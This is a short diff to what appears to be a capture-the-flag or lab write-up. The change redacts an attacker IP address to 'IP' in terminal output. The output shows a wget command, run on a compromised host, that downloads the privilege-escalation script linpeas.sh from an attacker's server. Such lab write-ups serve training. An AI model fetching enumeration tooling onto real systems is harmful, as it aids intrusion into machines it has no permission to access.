@@ -310,8 +310,8 @@ Delivering the Linpeas script to the target.
 
 ```
 love@election:/tmp$ wget http://IP:8000/linpeas.sh
---2025-02-14 02:36:01--  http://192.168.45.213:8000/linpeas.sh
-Connecting to 192.168.45.213:8000... connected.
+--2025-02-14 02:36:01--  http://IP:8000/linpeas.sh
+Connecting to IP:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 830426 (811K) [text/x-sh]
 Saving to: ‘linpeas.sh’
